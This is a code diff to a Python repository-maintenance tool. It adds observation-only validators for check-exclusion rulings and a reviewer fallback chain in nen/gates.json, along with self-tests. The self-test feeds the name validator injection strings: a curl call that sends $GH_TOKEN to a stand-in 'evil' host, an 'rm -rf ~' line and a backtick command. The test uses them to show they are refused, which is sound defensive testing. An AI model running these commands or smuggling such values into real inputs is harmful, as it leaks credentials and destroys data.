@@ -1567,6 +1567,186 @@ class PrivilegedWorkflows(Item):
         return self.detect(ctx)   # observation only; it writes nothing, ever
 
 
+class CheckExclusions(Item):
+    """nen/gates.json -> check_exclusions[] (zheref/hatsu#104): a maintainer's ruling that a check is
+    not watched has this one declared home. OBSERVATION ONLY -- a lapsed or unpassable row is DRIFT,
+    named, for the maintainer to remove or re-rule; Tenkai never rewrites a gate. Hatsu's own key;
+    nen keeps it as raw data (validating it is zheref/nen#249).
+
+    What a row must be, because every live row's `name` becomes one argv element of
+    `nen pr ready --exclude-check` (SEC-7): the name is letters, digits, spaces, `. _ / ( ) -` and
+    nothing else -- no comma (the flag's own separator), no quote, no shell metacharacter, no control
+    byte; `ruled` is a YYYY-MM-DD date not in the future; `until` is either a YYYY-MM-DD date or
+    `condition: <what lifts it>` -- a near-miss date is refused, never read as a condition, and a
+    condition row is re-examined every MAX_CONDITION_DAYS from `ruled`. The day is the declared
+    clock's (nen/workflow.json -> reports.timeZone), else the host's, and the detail says which."""
+
+    FIELDS = ("name", "reason", "ruled", "until")
+    NAME_OK = re.compile(r"^[A-Za-z0-9 ._/()\-]+$")
+    DATE = re.compile(r"^\d{4}-\d{2}-\d{2}$")
+    CONDITION = "condition: "
+    MAX_CONDITION_DAYS = 90
+
+    def __init__(self):
+        super().__init__("gates/check-exclusions", "the check-exclusion rulings nen pr ready is handed -- observation only: none lapsed, none unpassable", "hatsu")
+
+    @staticmethod
+    def today(ctx):
+        import datetime
+        tz = None
+        try:
+            tz = (json.loads((ctx.repo / "nen" / "workflow.json").read_text()).get("reports") or {}).get("timeZone")
+        except (OSError, ValueError, AttributeError):
+            tz = None
+        if isinstance(tz, str) and tz.strip():
+            try:
+                from zoneinfo import ZoneInfo
+                return datetime.datetime.now(ZoneInfo(tz)).date(), f"reports.timeZone {tz}"
+            except Exception:
+                return datetime.date.today(), f"the host's zone (reports.timeZone {tz!r} unknown here)"
+        return datetime.date.today(), "the host's zone (reports.timeZone unset)"
+
+    def detect(self, ctx):
+        import datetime
+        p = ctx.repo / "nen" / "gates.json"
+        if p.is_symlink():
+            return self.row(DRIFT, "nen/gates.json is a symlink -- a gate is read as a file of this repository, never through a link",
+                            "replace the link with the file")
+        if not p.is_file():
+            return self.row(SATISFIED, "no nen/gates.json -- nothing declared")
+        try:
+            doc = json.loads(p.read_text())
+        except (ValueError, OSError, UnicodeDecodeError):
+            return self.row(ROUTED, "nen/gates.json is not parseable -- nen schema check's row",
+                            f"nen schema check --repo {ctx.repo}")
+        if not isinstance(doc, dict):
+            return self.row(ROUTED, "nen/gates.json is not a JSON object -- nen schema check's row",
+                            f"nen schema check --repo {ctx.repo}")
+        rows = doc.get("check_exclusions", [])
+        if not isinstance(rows, list):
+            return self.row(DRIFT, "check_exclusions is not an array",
+                            "make it an array of {name, reason, ruled, until} rows, or [] for none")
+        if not rows:
+            return self.row(SATISFIED, "no check exclusion declared -- an empty array is a decision")
+        today, clock = self.today(ctx)
+        bad, expired, live = dated_rows(rows, "name", today)
+        if bad:
+            return self.row(DRIFT, "malformed -- " + "; ".join(bad) + " -- a row that cannot be passed safely is never put on the call",
+                            "complete the row as the $check_exclusions note shapes it, or remove it")
+        if expired:
+            return self.row(DRIFT, f"lapsed ({clock}): " + "; ".join(expired) + " -- the ruling has lapsed and the check is watched again",
+                            "remove the row, or re-rule it with today's date")
+        return self.row(SATISFIED, f"live ({clock}): " + "; ".join(live))
+
+    def repair(self, ctx):
+        # a lapsed or malformed ruling is the maintainer's to remove or re-rule; Tenkai never rewrites a gate
+        return self.detect(ctx)
+
+
+def dated_rows(rows, name_key, today, name_ok=CheckExclusions.NAME_OK, max_days=CheckExclusions.MAX_CONDITION_DAYS):
+    """The one validator both dated-ruling keys share (check_exclusions, reviewer_fallback.exhausted):
+    returns (bad, expired, live) descriptions. A near-miss date is refused, never read as a condition."""
+    import datetime
+    bad, expired, live = [], [], []
+    fields = (name_key, "reason", "ruled", "until")
+    for i, r in enumerate(rows):
+        if not isinstance(r, dict) or any(not isinstance(r.get(k), str) or not r.get(k).strip() for k in fields):
+            bad.append(f"row {i}: every row carries {name_key}, reason, ruled and until, non-empty strings")
+            continue
+        name, ruled_s, until = r[name_key], r["ruled"], r["until"]
+        if not name_ok.match(name):
+            bad.append(f"row {i}: {name_key} carries a character no argv element is handed (a comma, a quote, a shell metacharacter or a control byte)")
+            continue
+        if not CheckExclusions.DATE.match(ruled_s):
+            bad.append(f"row {i}: ruled is not a YYYY-MM-DD date")
+            continue
+        try:
+            ruled = datetime.date.fromisoformat(ruled_s)
+        except ValueError:
+            bad.append(f"row {i}: ruled is not a real date")
+            continue
+        if ruled > today:
+            bad.append(f"row {i}: ruled is in the future")
+            continue
+        if CheckExclusions.DATE.match(until):
+            try:
+                d = datetime.date.fromisoformat(until)
+            except ValueError:
+                bad.append(f"row {i}: until is not a real date")
+                continue
+            (expired if d < today else live).append(f"{name} (until {until})")
+        elif until.startswith(CheckExclusions.CONDITION) and until[len(CheckExclusions.CONDITION):].strip():
+            age = (today - ruled).days
+            if age > max_days:
+                expired.append(f"{name} ({until}; ruled {ruled_s}, {age} days ago -- unconfirmed past {max_days} days)")
+            else:
+                live.append(f"{name} ({until}; ruled {ruled_s})")
+        else:
+            bad.append(f"row {i}: until is neither a YYYY-MM-DD date nor 'condition: <what lifts it>'")
+    return bad, expired, live
+
+
+class ReviewerFallback(Item):
+    """nen/gates.json -> reviewer_fallback (the ruling of 2026-09-29): the chain holds reviewer identities
+    only, `terminal` is the local hanten rounds, and exhausted[] rows are dated rulings that lapse.
+    OBSERVATION ONLY. nen reads none of it (zheref/nen#275)."""
+
+    TERMINAL = "hanten"
+
+    def __init__(self):
+        super().__init__("gates/reviewer-fallback", "the reviewer fallback chain -- observation only: identities in the chain, a live exhaustion, the terminal", "hatsu")
+
+    def detect(self, ctx):
+        p = ctx.repo / "nen" / "gates.json"
+        if p.is_symlink():
+            return self.row(DRIFT, "nen/gates.json is a symlink -- a gate is read as a file of this repository, never through a link", "replace the link with the file")
+        if not p.is_file():
+            return self.row(SATISFIED, "no nen/gates.json -- nothing declared")
+        try:
+            doc = json.loads(p.read_text())
+        except (ValueError, OSError, UnicodeDecodeError):
+            return self.row(ROUTED, "nen/gates.json is not parseable -- nen schema check's row", f"nen schema check --repo {ctx.repo}")
+        if not isinstance(doc, dict):
+            return self.row(ROUTED, "nen/gates.json is not a JSON object -- nen schema check's row", f"nen schema check --repo {ctx.repo}")
+        fb = doc.get("reviewer_fallback")
+        if fb is None:
+            return self.row(SATISFIED, "no reviewer_fallback declared -- the configured reviewers are the whole gate")
+        if not isinstance(fb, dict):
+            return self.row(DRIFT, "reviewer_fallback is not an object", "shape it as {chain: [identities], terminal: 'hanten', exhausted: [rows]}")
+        identities = set()
+        for r in doc.get("reviewers") or []:
+            if isinstance(r, dict) and isinstance(r.get("name"), str):
+                identities.add(r["name"].lower())
+        chain = fb.get("chain")
+        if not isinstance(chain, list) or not chain or any(not isinstance(c, str) or not c.strip() for c in chain):
+            return self.row(DRIFT, "chain is not a non-empty array of reviewer names", "list the reviewer identities in fallback order")
+        if fb.get("terminal") != self.TERMINAL:
+            return self.row(DRIFT, f"terminal is {fb.get('terminal')!r}, not {self.TERMINAL!r} -- the terminal is the local hanten rounds, never a reviewer", "set terminal to 'hanten'")
+        if self.TERMINAL in [c.lower() for c in chain]:
+            return self.row(DRIFT, "the chain names the terminal as if it were a reviewer identity", "keep 'hanten' in terminal only")
+        rows = fb.get("exhausted", [])
+        if not isinstance(rows, list):
+            return self.row(DRIFT, "exhausted is not an array", "make it an array of {reviewer, reason, ruled, until} rows, or [] for none")
+        today, clock = CheckExclusions.today(ctx)
+        bad, expired, live = dated_rows(rows, "reviewer", today)
+        for i, r in enumerate(rows):
+            if isinstance(r, dict) and isinstance(r.get("reviewer"), str) and r["reviewer"].lower() not in [c.lower() for c in chain]:
+                bad.append(f"row {i}: reviewer {r['reviewer']!r} is not in the chain")
+        if bad:
+            return self.row(DRIFT, "malformed -- " + "; ".join(bad) + " -- a row that cannot be read is not honoured", "complete the row as the reviewer_fallback note shapes it, or remove it")
+        missing = [c for c in chain if c.lower() not in identities]
+        if expired:
+            return self.row(DRIFT, f"lapsed ({clock}): " + "; ".join(expired) + " -- the ruling has lapsed and the reviewer is requested again", "remove the row, or re-rule it with today's date")
+        if missing:
+            return self.row(ROUTED, f"live ({clock}): " + ("; ".join(live) or "no exhaustion") + f"; chain step(s) with no identity in reviewers[]: {', '.join(missing)} -- passed over until declared",
+                            "declare each reviewer's identity in nen/gates.json reviewers[] once its app is installed")
+        return self.row(SATISFIED, f"live ({clock}): " + ("; ".join(live) or "no exhaustion") + "; every chain step has an identity")
+
+    def repair(self, ctx):
+        # a lapsed ruling or an undeclared identity is the maintainer's; Tenkai never rewrites a gate
+        return self.detect(ctx)
+
+
 def items(ctx):
     out = [NenDeclaration(path, what) for path, what in NEN_DECLARATIONS]
     out.append(ColorsFile())
@@ -1585,6 +1765,8 @@ def items(ctx):
     out.extend(product_lane_items(ctx))
     out.extend(product_workflow_items(ctx))
     out.append(PrivilegedWorkflows())
+    out.append(CheckExclusions())
+    out.append(ReviewerFallback())
     return out
 
 
@@ -1596,7 +1778,13 @@ GLYPH = {SATISFIED: "ok  ", REPAIRED: "NEW ", MISSING: "MISS", DRIFT: "DRIF",
 
 
 def run(mode, ctx):
-    rows = [(it.repair(ctx) if mode == "apply" else it.detect(ctx)) for it in items(ctx)]
+    def guarded(it):
+        # one item's raise is that item's BLOCKED row, never the whole report's (QA-16: the tool keeps reporting)
+        try:
+            return it.repair(ctx) if mode == "apply" else it.detect(ctx)
+        except Exception as e:  # noqa: BLE001 -- named, not hidden
+            return it.row(BLOCKED, f"{type(e).__name__}: {e} -- this item could not be read; the rest of the report stands", None)
+    rows = [guarded(it) for it in items(ctx)]
     return {"contract": CONTRACT, "mode": mode, "repo": str(ctx.repo), "slug": ctx.slug,
             "runner": ctx.runner, "items": rows,
             "outstanding": sum(1 for r in rows if r["state"] in OUTSTANDING)}
@@ -2435,6 +2623,92 @@ def self_test() -> int:
         return [l for l in pth.read_text().splitlines() if not l.lstrip().startswith("#")]
     check("templates/colors.yml and nen/colors.yml carry the same vocabulary",
           body(root / "templates" / "colors.yml") == body(root / "nen" / "colors.yml"))
+
+    print("\ncheck exclusions -- the ruling's declared home, its shape and its expiry (zheref/hatsu#104)")
+    import datetime as _dt
+    _today = _dt.date.today().isoformat()
+    _old = (_dt.date.today() - _dt.timedelta(days=120)).isoformat()
+    dx = fixture()
+    (dx / "nen").mkdir(parents=True, exist_ok=True)
+    gates = dx / "nen" / "gates.json"
+
+    def ex(rows):
+        gates.write_text(json.dumps({"check_exclusions": rows}))
+        return CheckExclusions().detect(ctx_for(dx))
+
+    def row(**kw):
+        base = {"name": "check (Windows)", "reason": "no runner", "ruled": _today, "until": "2999-01-01"}
+        base.update(kw)
+        return base
+    check("no gates.json is satisfied (nothing declared)", CheckExclusions().detect(ctx_for(dx))["state"] == SATISFIED)
+    check("an empty array is satisfied, and said to be a decision", "decision" in ex([])["detail"])
+    r = ex([row()])
+    check("a live dated row is satisfied, named, with the clock named", r["state"] == SATISFIED and "check (Windows)" in r["detail"] and "zone" in r["detail"])
+    r = ex([row(until="condition: the runner is enabled")])
+    check("a condition row is live, reported with its condition", r["state"] == SATISFIED and "the runner is enabled" in r["detail"])
+    r = ex([row(until="condition: the runner is enabled", ruled=_old)])
+    check("a condition row older than 90 days is DRIFT, unconfirmed", r["state"] == DRIFT and "unconfirmed" in r["detail"] and "re-rule" in (r["action"] or ""))
+    r = ex([row(until="2026-09-01")])
+    check("a row past its until date is DRIFT, lapsed, with the re-rule action", r["state"] == DRIFT and "lapsed" in r["detail"] and "re-rule" in (r["action"] or ""))
+    for near in ("2026-9-1", "09/01/2026", "2026-09-01 (or when the runner lands)", "the runner is enabled", "2026-02-30"):
+        r = ex([row(until=near)])
+        check(f"until {near!r} is neither a date nor a condition: DRIFT, never read as live", r["state"] == DRIFT and "neither" in r["detail"] or (near == "2026-02-30" and r["state"] == DRIFT))
+    for badname in ("x\"; curl http://evil/$GH_TOKEN #", "ok\nrm -rf ~", "a`id`b", "check (Windows, windows-latest)", "lint, typecheck"):
+        r = ex([row(name=badname)])
+        check(f"name {badname[:24]!r} is refused at the declaration, never put on the call", r["state"] == DRIFT and "argv" in r["detail"] and "never put on the call" in r["detail"])
+    r = ex([row(ruled="2999-01-01")])
+    check("ruled in the future is DRIFT", r["state"] == DRIFT and "future" in r["detail"])
+    r = ex([row(ruled="2026-9-1")])
+    check("ruled not YYYY-MM-DD is DRIFT", r["state"] == DRIFT and "ruled" in r["detail"])
+    r = ex([{"name": "check (Windows)", "ruled": _today}])
+    check("a row missing a field is DRIFT, never honoured", r["state"] == DRIFT)
+    gates.write_text(json.dumps({"check_exclusions": {"name": "x"}}))
+    check("a non-array is DRIFT", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
+    gates.write_text("[]")
+    check("a top-level array is ROUTED to nen schema check, never a traceback", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
+    gates.write_text("{not json")
+    check("unparseable gates.json is ROUTED to nen schema check", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
+    gates.write_bytes(b"\xff\xfe{")
+    check("a non-UTF-8 gates.json is ROUTED, never a traceback", CheckExclusions().detect(ctx_for(dx))["state"] == ROUTED)
+    gates.unlink(); gates.symlink_to(Path(tempfile.gettempdir()))
+    check("a symlinked gates.json is DRIFT, never read through", CheckExclusions().detect(ctx_for(dx))["state"] == DRIFT)
+    gates.unlink(); gates.write_text("[]")
+    full = run("diagnose", ctx_for(dx))
+    check("a diagnose over a wrongly shaped gates.json still reports every item", any(r["id"] == "gates/check-exclusions" for r in full["items"]) and len(full["items"]) > 5)
+    gates.unlink(); gates.write_text(json.dumps({"check_exclusions": []}))
+    (dx / "nen" / "workflow.json").write_text(json.dumps({"reports": {"timeZone": "America/Bogota"}}))
+    r = ex([row()])
+    check("the declared reports.timeZone is the clock, and is named", "America/Bogota" in r["detail"])
+
+    print("\nreviewer fallback -- identities in the chain, the terminal, a live exhaustion (ruling 2026-09-29)")
+    dr = fixture()
+    (dr / "nen").mkdir(parents=True, exist_ok=True)
+    gr = dr / "nen" / "gates.json"
+
+    def fb(block, reviewers=("copilot",)):
+        gr.write_text(json.dumps({"reviewers": [{"name": n} for n in reviewers], "reviewer_fallback": block}))
+        return ReviewerFallback().detect(ctx_for(dr))
+    gr.write_text(json.dumps({"reviewers": [{"name": "copilot"}]}))
+    check("no reviewer_fallback is satisfied", ReviewerFallback().detect(ctx_for(dr))["state"] == SATISFIED)
+    ok_row = {"reviewer": "copilot", "reason": "credits", "ruled": _today, "until": "condition: the credits are restored"}
+    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [ok_row]})
+    check("a live exhaustion with every chain step declared is satisfied", r["state"] == SATISFIED and "copilot" in r["detail"])
+    r = fb({"chain": ["copilot", "cursor"], "terminal": "hanten", "exhausted": [ok_row]})
+    check("a chain step with no identity is ROUTED, named, never DRIFT", r["state"] == ROUTED and "cursor" in r["detail"])
+    r = fb({"chain": ["copilot", "hanten"], "terminal": "hanten", "exhausted": []})
+    check("the terminal inside the chain is DRIFT", r["state"] == DRIFT)
+    r = fb({"chain": ["copilot"], "terminal": "copilot", "exhausted": []})
+    check("a terminal that is not hanten is DRIFT", r["state"] == DRIFT)
+    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [dict(ok_row, ruled=_old)]})
+    check("a condition exhaustion older than 90 days is DRIFT, lapsed", r["state"] == DRIFT and "lapsed" in r["detail"])
+    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [dict(ok_row, until="2026-9-1")]})
+    check("a near-miss date in an exhaustion is DRIFT, never a condition", r["state"] == DRIFT and "neither" in r["detail"])
+    r = fb({"chain": ["copilot"], "terminal": "hanten", "exhausted": [dict(ok_row, reviewer="bugbot")]})
+    check("an exhausted reviewer not in the chain is DRIFT", r["state"] == DRIFT and "not in the chain" in r["detail"])
+    r = fb({"chain": [], "terminal": "hanten", "exhausted": []})
+    check("an empty chain is DRIFT", r["state"] == DRIFT)
+    gr.write_text(json.dumps({"reviewers": [{"name": "copilot"}], "reviewer_fallback": "x"}))
+    check("a non-object reviewer_fallback is DRIFT", ReviewerFallback().detect(ctx_for(dr))["state"] == DRIFT)
 
     print("\nblocked states are reported, never repaired around")
     d5 = fixture()
